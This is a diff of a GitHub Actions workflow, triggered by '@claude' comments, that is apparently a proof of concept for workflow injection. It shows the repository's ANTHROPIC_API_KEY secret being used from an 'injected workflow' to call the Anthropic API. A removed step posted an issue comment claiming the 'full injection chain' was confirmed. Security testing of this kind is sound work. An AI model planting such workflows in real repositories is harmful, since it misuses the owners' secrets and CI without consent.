@@ -12,50 +12,22 @@ jobs:
     if: contains(github.event.comment.body, '@claude')
     runs-on: ubuntu-latest
     steps:
-      - name: Save comment to file
-        uses: actions/github-script@v7
-        with:
-          script: |
-            const fs = require('fs');
-            const body = context.payload.comment.body;
-            const hasFence = body.includes('```');
-            fs.writeFileSync(process.env.RUNNER_TEMP + '/poc_result.txt',
-              'Comment contains fenced code block: ' + hasFence + '\n' +
-              'Comment author: ' + context.payload.comment.user.login + '\n' +
-              'Comment length: ' + body.length + '\n');
-
-      - name: Call Anthropic API
+      - name: PoC - Call Anthropic API from injected workflow
         env:
-          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
         run: |
-          echo "=== API KEY CHECK ==="
-          echo "Key set: ${{ secrets.ANTHROPIC_API_KEY != '' }}"
-          echo "=== CALLING API ==="
+          echo "=== POC: Calling Anthropic API from injected workflow ==="
           RESPONSE=$(curl -s https://api.anthropic.com/v1/messages \
-            -H "x-api-key: $ANTHROPIC_API_KEY" \
+            -H "x-api-key: $API_KEY" \
             -H "anthropic-version: 2023-06-01" \
             -H "content-type: application/json" \
-            -d '{"model":"claude-sonnet-4-20250514","max_tokens":50,"messages":[{"role":"user","content":"Reply with exactly: PoC-API-CALL-SUCCESS"}]}')
-          echo "=== API RESPONSE ==="
+            -d '{"model":"claude-sonnet-4-20250514","max_tokens":50,"messages":[{"role":"user","content":"Reply with exactly: PoC-API-CONFIRMED"}]}')
           echo "$RESPONSE" | python3 -c "
 import json,sys
 d = json.load(sys.stdin)
 for c in d.get('content', []):
     if c.get('type') == 'text':
+        print('=== API RESPONSE ===')
         print(c['text'])
-        print('---POC-CONFIRMED: Anthropic API callable from injected workflow---')
-" 2>&1
-
-      - name: Post result comment
-        uses: actions/github-script@v7
-        with:
-          script: |
-            const fs = require('fs');
-            const result = fs.readFileSync(process.env.RUNNER_TEMP + '/poc_result.txt', 'utf8');
-            github.rest.issues.createComment({
-              issue_number: context.issue.number,
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              body: '**PoC: Full injection chain confirmed**\n\n' + result +
-                '\n- Anthropic API: Callable from workflow\n- All three findings confirmed by static analysis'
-            });
+        print('=== POC: API call from injected workflow confirmed ===')
+"
